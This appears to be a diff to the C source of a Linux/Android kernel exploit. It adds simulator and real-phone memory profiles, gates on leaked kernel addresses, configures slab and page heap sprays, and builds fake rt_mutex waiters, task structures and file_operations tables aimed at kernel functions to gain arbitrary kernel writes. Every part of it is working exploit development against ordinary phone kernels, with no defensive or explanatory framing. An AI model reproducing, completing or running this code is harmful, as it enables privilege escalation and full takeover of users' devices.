@@ -73,6 +73,163 @@ int env_int_range(const char *name, int def, int min, int max) {
   return (int)value;
 }
 
+enum p0_profile {
+  P0_PROFILE_TRUEPHONE = 0,
+  P0_PROFILE_SIM = 1,
+};
+
+#define P0_SIM_PHYS_OFFSET 0x40000000ULL
+#define P0_SIM_KERNEL_PHYS_LOAD 0x40200000ULL
+
+static atomic_int cached_p0_profile = ATOMIC_VAR_INIT(-1);
+
+static int p0_profile_from_string(const char *arg) {
+  if (!arg || !*arg) {
+    return -1;
+  }
+  if (!strcasecmp(arg, "sim") || !strcasecmp(arg, "qemu") ||
+      !strcasecmp(arg, "gem5") || !strcasecmp(arg, "local")) {
+    return P0_PROFILE_SIM;
+  }
+  if (!strcasecmp(arg, "truephone") || !strcasecmp(arg, "phone") ||
+      !strcasecmp(arg, "device") || !strcasecmp(arg, "real")) {
+    return P0_PROFILE_TRUEPHONE;
+  }
+  return -1;
+}
+
+static int file_contains_text(const char *path, const char *needle) {
+  char buf[1024];
+  int fd = open(path, O_RDONLY | O_CLOEXEC);
+  ssize_t n;
+
+  if (fd < 0) {
+    return 0;
+  }
+  n = read(fd, buf, sizeof(buf) - 1);
+  close(fd);
+  if (n <= 0) {
+    return 0;
+  }
+  buf[n] = 0;
+  return strstr(buf, needle) != NULL;
+}
+
+static int detect_p0_profile(void) {
+  int selected = p0_profile_from_string(getenv("CATMOVE_P0_PROFILE"));
+  if (selected >= 0) {
+    return selected;
+  }
+  selected = p0_profile_from_string(getenv("IONCAT_P0_PROFILE"));
+  if (selected >= 0) {
+    return selected;
+  }
+  selected = p0_profile_from_string(getenv("P0_PROFILE"));
+  if (selected >= 0) {
+    return selected;
+  }
+
+  if (file_contains_text("/proc/cmdline", "androidboot.hardware=gem5") ||
+      file_contains_text("/proc/cmdline", "qemu") ||
+      file_contains_text("/proc/device-tree/model", "dummy-virt") ||
+      file_contains_text("/proc/cpuinfo", "dummy-virt")) {
+    return P0_PROFILE_SIM;
+  }
+  return P0_PROFILE_TRUEPHONE;
+}
+
+static int p0_profile_kind(void) {
+  int selected = atomic_load_explicit(&cached_p0_profile, memory_order_acquire);
+
+  if (selected >= 0) {
+    return selected;
+  }
+  selected = detect_p0_profile();
+  atomic_store_explicit(&cached_p0_profile, selected, memory_order_release);
+  return selected;
+}
+
+const char *p0_active_profile(void) {
+  return p0_profile_kind() == P0_PROFILE_SIM ? "sim" : "truephone";
+}
+
+uintptr_t p0_phys_offset(void) {
+  return p0_profile_kind() == P0_PROFILE_SIM ?
+      P0_SIM_PHYS_OFFSET : P0_PHYS_OFFSET;
+}
+
+uintptr_t p0_kernel_phys_load(void) {
+  return p0_profile_kind() == P0_PROFILE_SIM ?
+      P0_SIM_KERNEL_PHYS_LOAD : P0_KERNEL_PHYS_LOAD;
+}
+
+uintptr_t p0_kernel_phys_delta(void) {
+  return p0_kernel_phys_load() - p0_phys_offset();
+}
+
+static int env_uintptr_value(const char *name, uintptr_t *out) {
+  const char *arg = getenv(name);
+  char *end = NULL;
+  unsigned long long value;
+
+  if (!arg || !*arg) {
+    return 0;
+  }
+  errno = 0;
+  value = strtoull(arg, &end, 0);
+  if (errno || !end || *end) {
+    pr_warning("bad %s value=%s; ignoring\n", name, arg);
+    return 0;
+  }
+  *out = (uintptr_t)value;
+  return 1;
+}
+
+static int slide_page_source_allowed(uintptr_t leaked, uintptr_t base) {
+  int exact = env_int_range("SLIDE_LEAKED_OFF_EXACT", -1,
+                            -1, (int)ORDER3_SIZE - 1);
+  uintptr_t base_min = 0;
+  uintptr_t base_max = ~(uintptr_t)0;
+  int have_base_min = env_uintptr_value("SLIDE_PAGE_BASE_MIN", &base_min);
+  int have_base_max = env_uintptr_value("SLIDE_PAGE_BASE_MAX", &base_max);
+
+  if (exact >= 0 && (int)(leaked & (ORDER3_SIZE - 1)) != exact) {
+    return 0;
+  }
+  if (have_base_min && base < base_min) {
+    return 0;
+  }
+  if (have_base_max && base > base_max) {
+    return 0;
+  }
+  return 1;
+}
+
+static int page_source_allowed(int payload_mode, uintptr_t leaked,
+                               uintptr_t base) {
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    return slide_page_source_allowed(leaked, base);
+  }
+
+  int exact = env_int_range("PAGE_LEAKED_OFF_EXACT", -1,
+                            -1, (int)ORDER3_SIZE - 1);
+  uintptr_t base_min = 0;
+  uintptr_t base_max = ~(uintptr_t)0;
+  int have_base_min = env_uintptr_value("PAGE_BASE_MIN", &base_min);
+  int have_base_max = env_uintptr_value("PAGE_BASE_MAX", &base_max);
+
+  if (exact >= 0 && (int)(leaked & (ORDER3_SIZE - 1)) != exact) {
+    return 0;
+  }
+  if (have_base_min && base < base_min) {
+    return 0;
+  }
+  if (have_base_max && base > base_max) {
+    return 0;
+  }
+  return 1;
+}
+
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
@@ -135,14 +292,15 @@ void log_startup_context(void) {
   pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
-  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
-             getpid(), BUILD_VARIANT_LABEL);
+  pr_success("build config pid=%d label=%s p0_active=%s slide=pselect "
+             "main=pselect\n", getpid(), BUILD_VARIANT_LABEL,
+             p0_active_profile());
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
-             getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)P0_KERNEL_PHYS_LOAD,
-             (unsigned long long)P0_KERNEL_PHYS_DELTA,
+             getpid(), (unsigned long long)p0_phys_offset(),
+             (unsigned long long)p0_kernel_phys_load(),
+             (unsigned long long)p0_kernel_phys_delta(),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
@@ -175,7 +333,8 @@ long sched_setattr_tid(int tid, int nice_value) {
   struct local_sched_attr attr;
   memset(&attr, 0, sizeof(attr));
   attr.size = sizeof(attr);
-  attr.sched_policy = SCHED_BATCH;
+  attr.sched_policy = env_flag("SLIDE_SCHED_OTHER", 1) ?
+      SCHED_OTHER : SCHED_BATCH;
   attr.sched_nice = nice_value;
   return syscall(SYS_sched_setattr, tid, &attr, 0);
 }
@@ -258,12 +417,12 @@ int has_zero_byte(uintptr_t value) {
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
-  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
-  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+  uintptr_t phys = p0_kernel_phys_load() + off;
+  return ((phys - p0_phys_offset()) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
+  return (data_alias - P0_PAGE_OFFSET) - p0_kernel_phys_delta();
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -313,6 +472,13 @@ int pselect_write_shape(void) {
   }
   return env_int_range("TMP_UNAME_PSELECT_WRITE_SHAPE",
                        PSELECT_WRITE_SHAPE_DEFAULT, 0, 1);
+}
+
+static uintptr_t stage0_logger_addr(void) {
+  if (env_flag("SLIDE_STAGE0_LOGGER_SLOT2", 1)) {
+    return SLIDE_LOGGERS_0_1 + 0x20;
+  }
+  return SLIDE_LOGGERS_0_1;
 }
 
 void set_pselect_write(uintptr_t target, uintptr_t value) {
@@ -510,6 +676,22 @@ static void put_p9_fops_waiter(unsigned char *p, uintptr_t write_pc,
   put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
 }
 
+static void put_tcp_fake_fops_table(unsigned char *p, size_t off) {
+  put64(p, off + FOPS_OWNER_OFF, 0);
+  put64(p, off + FOPS_LLSEEK_OFF, 0);
+  put64(p, off + FOPS_READ_OFF, fake_w0 + WAITER_PI_TREE_ENTRY_OFF);
+  put64(p, off + FOPS_WRITE_OFF, 0);
+  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
+  put64(p, off + FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER));
+  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL));
+  put64(p, off + FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL));
+  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP));
+  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN));
+  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE));
+  put64(p, off + FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ));
+  put64(p, off + FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO));
+}
+
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
@@ -518,17 +700,46 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     payload_delta = env_int_range(
         "SLIDE_SKB_DATA_DELTA", SKB_DATA_DELTA, -0x8000, 0x8000);
   }
+  int standalone_tcp_payload =
+      payload_mode == PAGE_PAYLOAD_SLIDE &&
+      env_flag("SLIDE_STANDALONE_TCP_PAYLOAD", 1);
+  int main_tcp_payload =
+      payload_mode == PAGE_PAYLOAD_FOPS &&
+      env_flag("MAIN_TCP_PAYLOAD", 1);
+  if (standalone_tcp_payload) {
+    payload_delta = 0;
+  } else if (main_tcp_payload) {
+    payload_delta = 0;
+  }
   uintptr_t payload_base = base + payload_delta;
+  size_t payload_bias =
+      (standalone_tcp_payload || main_tcp_payload) ? 0xe80 : SKB_FRAG_BIAS;
+  size_t fake_task_off =
+      (standalone_tcp_payload || main_tcp_payload) ? 0x5800 : FAKE_TASK_OFF;
+  size_t fake_fops_off = main_tcp_payload ? 0x3338 : FOPS_TABLE_OFF;
 
   fake_lock = payload_base + LOCK_OFF;
   fake_w0 = payload_base + W0_OFF;
-  fake_task = payload_base + FAKE_TASK_OFF;
-  fake_fops = payload_base + FOPS_TABLE_OFF;
+  fake_task = payload_base + fake_task_off;
+  fake_fops = payload_base + fake_fops_off;
   int write_shape = pselect_write_shape();
   uintptr_t write_target = pselect_write_target();
   uintptr_t write_value = pselect_write_value();
+  int simple_pselect_fops =
+      payload_mode == PAGE_PAYLOAD_FOPS &&
+      env_flag("PSELECT_SIMPLE_LAYOUT", 0);
 
-  if (payload_mode == PAGE_PAYLOAD_FOPS) {
+  if (main_tcp_payload) {
+    fake_parent = data_addr(ASHMEM_MISC_FOPS) - 8;
+    fake_right = fake_fops;
+    fake_left = payload_base + LEFT_OFF;
+    binwrite_target = payload_base + fake_fops_off + 0x700;
+  } else if (simple_pselect_fops) {
+    fake_parent = fake_fops;
+    fake_right = data_addr(ASHMEM_MISC_FOPS);
+    fake_left = 0;
+    binwrite_target = payload_base + SCRATCH_OFF;
+  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
     if (write_shape == 1 && write_target >= 8) {
       fake_parent = write_target - 8;
       fake_right = write_value;
@@ -564,16 +775,31 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   int slide_fake_task_pi_top_init =
       payload_mode == PAGE_PAYLOAD_SLIDE &&
       env_flag("SLIDE_FAKE_TASK_PI_TOP_INIT", 0);
-  if (payload_mode == PAGE_PAYLOAD_FOPS && pselect_custom_write_enabled()) {
+  const char *slide_lock_top_delta_arg =
+      payload_mode == PAGE_PAYLOAD_SLIDE ?
+      getenv("SLIDE_LOCK_TOP_WAITER_DELTA") : NULL;
+  int slide_lock_top_delta_set =
+      slide_lock_top_delta_arg && *slide_lock_top_delta_arg;
+  int slide_lock_top_delta = slide_lock_top_delta_set ?
+      env_int_range("SLIDE_LOCK_TOP_WAITER_DELTA", 0, -0x1000, 0x1000) : 0;
+  if (main_tcp_payload) {
+    waiter_task = SLIDE_INIT_TASK;
+    task_group = SLIDE_ROOT_TASK_GROUP;
+    pi_top_task = 0;
+  } else if (payload_mode == PAGE_PAYLOAD_FOPS && pselect_custom_write_enabled()) {
     waiter_task = fake_task;
     task_group = 0;
     pi_top_task = fake_task;
   }
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    write_pc = SLIDE_LOGGERS_0_1;
+    write_pc = stage0_logger_addr();
     write_right = 0;
     write_left = SLIDE_RANDOM_BOOT_ID_DATA;
-    if (env_flag("SLIDE_FAKE_TASK", 0)) {
+    if (standalone_tcp_payload) {
+      waiter_task = SLIDE_INIT_TASK;
+      task_group = SLIDE_ROOT_TASK_GROUP;
+      pi_top_task = 0;
+    } else if (env_flag("SLIDE_FAKE_TASK", 0)) {
       waiter_task = fake_task;
       task_group = slide_fake_task_root_task_group ?
           SLIDE_ROOT_TASK_GROUP : 0;
@@ -584,50 +810,96 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       task_group = SLIDE_ROOT_TASK_GROUP;
       pi_top_task = SLIDE_INIT_TASK;
     }
+    if (env_flag("SLIDE_WRITE_SCRATCH", 0)) {
+      write_pc = payload_base + RIGHT_OFF;
+      write_right = 0;
+      write_left = payload_base + SCRATCH_OFF;
+    }
     if (slide_owner_null_shape) {
       pi_top_task = 0;
     }
+  } else if (main_tcp_payload) {
+    write_pc = fake_fops;
+    write_right = 0;
+    write_left = data_addr(ASHMEM_MISC_FOPS);
+  } else if (simple_pselect_fops) {
+    write_pc = fake_fops;
+    write_right = data_addr(ASHMEM_MISC_FOPS);
+    write_left = 0;
   } else if (write_shape == 1 && write_target >= 8) {
     write_pc = write_target - 8;
     write_right = write_value;
     write_left = 0;
   }
 
-  pr_info("fake payload mode=%d write_shape=%d lock=%016zx w0=%016zx "
-          "task=%016zx write_parent=%016zx write_right=%016zx "
-          "write_left=%016zx\n",
-          payload_mode, write_shape, fake_lock, fake_w0, fake_task,
+  pr_info("fake payload mode=%d write_shape=%d standalone_tcp=%d main_tcp=%d "
+          "delta=%x bias=%zx lock=%016zx w0=%016zx task=%016zx task_off=%zx "
+          "fops_off=%zx lock_top_delta=%d write_parent=%016zx "
+          "write_right=%016zx write_left=%016zx\n",
+          payload_mode, write_shape, standalone_tcp_payload, main_tcp_payload,
+          payload_delta, payload_bias, fake_lock, fake_w0, fake_task,
+          fake_task_off, fake_fops_off,
+          slide_lock_top_delta_set ? slide_lock_top_delta : 0,
           write_pc, write_right, write_left);
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+    unsigned char *p = skb_buf + chunk + payload_bias;
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE &&
-        !env_flag("SLIDE_STAGE0_LOCK_SHAPE", 0) &&
-        !slide_owner_null_shape) {
+        !env_flag("SLIDE_STAGE0_LOCK_SHAPE", 1) &&
+        !slide_owner_null_shape && !slide_lock_top_delta_set) {
       put64(p, LOCK_OFF + 0x08, 0);
       put64(p, LOCK_OFF + 0x10, 0);
       put64(p, LOCK_OFF + 0x18, 0);
     } else {
-      put64(p, LOCK_OFF + 0x08, fake_w0);
-      put64(p, LOCK_OFF + 0x10, fake_w0);
+      uintptr_t lock_top_waiter = fake_w0 + (intptr_t)slide_lock_top_delta;
+      put64(p, LOCK_OFF + 0x08, lock_top_waiter);
+      put64(p, LOCK_OFF + 0x10, lock_top_waiter);
       put64(p, LOCK_OFF + 0x18,
             slide_owner_null_shape ? 1 : (fake_task | 1));
     }
 
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    if (main_tcp_payload) {
+      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x08, 0);
+      put64(p, W0_OFF + 0x10, 0);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);
+      put32(p, W0_OFF + WAITER_PRIO_OFF, 0);
+      put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
+    } else if (payload_mode == PAGE_PAYLOAD_FOPS && !simple_pselect_fops) {
       put_p9_fops_waiter(p, write_pc, write_right, write_left, waiter_task);
+    } else if (standalone_tcp_payload) {
+      put64(p, W0_OFF + 0x00, 1);
+      put64(p, W0_OFF + 0x08, 0);
+      put64(p, W0_OFF + 0x10, 0);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
+      put64(p, W0_OFF + WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
+      put64(p, W0_OFF + WAITER_TASK_OFF, waiter_task);
+      put64(p, W0_OFF + WAITER_LOCK_OFF, fake_lock);
+      put32(p, W0_OFF + WAITER_WAKE_STATE_OFF, 0);
+      put32(p, W0_OFF + WAITER_PRIO_OFF, 0);
+      put64(p, W0_OFF + WAITER_DEADLINE_OFF, 0);
+      put64(p, W0_OFF + WAITER_WW_CTX_OFF, 0);
     } else {
       put64(p, W0_OFF + 0x00, 1);
       put64(p, W0_OFF + 0x08, 0);
       put64(p, W0_OFF + 0x10, 0);
-      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF,
+            standalone_tcp_payload ? 0 : FAKE_WAITER_PRIO);
       put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
+      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF,
+            standalone_tcp_payload ? 0 : FAKE_WAITER_PRIO);
       put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
       put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
       put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
@@ -635,31 +907,36 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
     }
 
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF,
-          FAKE_UCLAMP_MIN_ACTIVE);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_REQ_OFF + 0x04,
-          FAKE_UCLAMP_MAX_ACTIVE);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF,
-          FAKE_UCLAMP_MIN_ACTIVE);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_UCLAMP_OFF + 0x04,
-          FAKE_UCLAMP_MAX_ACTIVE);
-    put32(p, FAKE_TASK_OFF + FAKE_TASK_PI_LOCK_OFF, 0);
-    if (payload_mode == PAGE_PAYLOAD_FOPS || slide_owner_null_shape ||
-        slide_fake_task_pi_waiters_zero) {
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
+    put32(p, fake_task_off + FAKE_TASK_USAGE_OFF, 0x100);
+    put32(p, fake_task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
+    put32(p, fake_task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
+    if (!simple_pselect_fops &&
+        !(payload_mode == PAGE_PAYLOAD_SLIDE &&
+          (env_flag("SLIDE_SKIP_FAKE_TASK_UCLAMP", 0) ||
+           standalone_tcp_payload))) {
+      put32(p, fake_task_off + FAKE_TASK_UCLAMP_REQ_OFF,
+            FAKE_UCLAMP_MIN_ACTIVE);
+      put32(p, fake_task_off + FAKE_TASK_UCLAMP_REQ_OFF + 0x04,
+            FAKE_UCLAMP_MAX_ACTIVE);
+      put32(p, fake_task_off + FAKE_TASK_UCLAMP_OFF,
+            FAKE_UCLAMP_MIN_ACTIVE);
+      put32(p, fake_task_off + FAKE_TASK_UCLAMP_OFF + 0x04,
+            FAKE_UCLAMP_MAX_ACTIVE);
+    }
+    put32(p, fake_task_off + FAKE_TASK_PI_LOCK_OFF, 0);
+    if (payload_mode == PAGE_PAYLOAD_FOPS || standalone_tcp_payload ||
+        slide_owner_null_shape || slide_fake_task_pi_waiters_zero) {
+      put64(p, fake_task_off + FAKE_TASK_PI_WAITERS_OFF, 0);
+      put64(p, fake_task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
     } else {
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
+      put64(p, fake_task_off + FAKE_TASK_PI_WAITERS_OFF,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-      put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
+      put64(p, fake_task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
             fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
     }
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
-    put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
+    put64(p, fake_task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
+    put64(p, fake_task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
+    put64(p, fake_task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
 
     put64(p, RIGHT_OFF + 0x00, fake_parent);
     put64(p, RIGHT_OFF + 0x08, 0);
@@ -669,7 +946,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     put64(p, LEFT_OFF + 0x08, 0);
     put64(p, LEFT_OFF + 0x10, 0);
 
-    if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    if (main_tcp_payload) {
+      put_tcp_fake_fops_table(p, fake_fops_off);
+    } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
     }
   }
@@ -678,8 +957,27 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  int standalone_tcp_payload =
+      payload_mode == PAGE_PAYLOAD_SLIDE &&
+      env_flag("SLIDE_STANDALONE_TCP_PAYLOAD", 1);
+  int main_tcp_payload =
+      payload_mode == PAGE_PAYLOAD_FOPS &&
+      env_flag("MAIN_TCP_PAYLOAD", 1);
+  int tcp_payload = standalone_tcp_payload || main_tcp_payload;
+  size_t mm_struct_sz = tcp_payload ? 1024 : MM_STRUCT_SZ;
+  uintptr_t mm_struct_override = 0;
+  if (env_uintptr_value("PAGE_MM_STRUCT_SZ", &mm_struct_override) &&
+      mm_struct_override >= 0x100 && mm_struct_override <= ORDER3_SIZE) {
+    mm_struct_sz = (size_t)mm_struct_override;
+  }
+  mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz;
   prepare_ctxs();
+  int collision_count = tcp_payload ? 8 : kernelsnitch_collision_count();
+  collision_count = env_int_range("PAGE_COLLISIONS", collision_count, 1, 64);
+  pr_info("prepare_kernel_page geom mode=%d standalone_tcp=%d main_tcp=%d "
+          "mm_struct_sz=%zu objs_per_slab=%zu collisions=%d\n",
+          payload_mode, standalone_tcp_payload, main_tcp_payload, mm_struct_sz,
+          mm_objs_per_slab, collision_count);
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
@@ -696,7 +994,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, kernelsnitch_collision_count(), 0, 0);
+      mm_struct_sz, MM_ORDER, cpu_count, collision_count, 0, 0);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -752,6 +1050,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("prepare_kernel_page leaked_mm=%016zx base=%016zx mode=%d\n",
           leaked, base, payload_mode);
+  if (!page_source_allowed(payload_mode, leaked, base)) {
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -782,13 +1089,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   msg.msg_iov = &iov;
   msg.msg_iovlen = 1;
 
-  SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
+  int pcp_sends = env_int_range("PAGE_PCP_SENDS", 1, 0, 64);
+  for (int i = 0; i < pcp_sends; i++) {
+    errno = 0;
+    ssize_t sent = sendmsg(pcp_shaping_sv[0], &msg, 0);
+    pr_info("sk_buff pcp send %d/%d ret=%zd errno=%d\n",
+            i + 1, pcp_sends, sent, errno);
+    if (sent <= 0) {
+      break;
+    }
+  }
 
   pin_to_core(CORE);
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
+  int pre_yields = env_int_range("PAGE_PRE_CLOSE_YIELDS", 4, 0, 1024);
+  for (int i = 0; i < pre_yields; i++) {
+    sched_yield();
+  }
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     SYSCHK(close(pre_ctx.memfds[i]));
     pre_ctx.memfds[i] = -1;
@@ -797,17 +1113,20 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
-  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
+  int spray_stride_env =
+      env_int_range("PAGE_SPRAY_STRIDE", (int)mm_objs_per_slab, 1, 1024);
+  size_t spray_stride = (size_t)spray_stride_env;
+  for (size_t i = 0; i < spray_ctx.mm_cnt; i += spray_stride) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
   }
 
   SYSCHK(close(pcp_shaping_sv[0]));
   SYSCHK(close(pcp_shaping_sv[1]));
-  sched_yield();
-  sched_yield();
-  sched_yield();
-  sched_yield();
+  int post_yields = env_int_range("PAGE_POST_CLOSE_YIELDS", 4, 0, 1024);
+  for (int i = 0; i < post_yields; i++) {
+    sched_yield();
+  }
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
   int reclaim_sends =
@@ -840,6 +1159,14 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
     max_attempts = SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS;
   } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
     max_attempts = FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
+  }
+  max_attempts = env_int_range("PAGE_SETUP_ATTEMPTS", max_attempts, 1, 4096);
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    max_attempts = env_int_range("SLIDE_PAGE_SETUP_ATTEMPTS",
+                                 max_attempts, 1, 4096);
+  } else if (payload_mode == PAGE_PAYLOAD_FOPS) {
+    max_attempts = env_int_range("FOPS_PAGE_SETUP_ATTEMPTS",
+                                 max_attempts, 1, 4096);
   }
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(payload_mode);
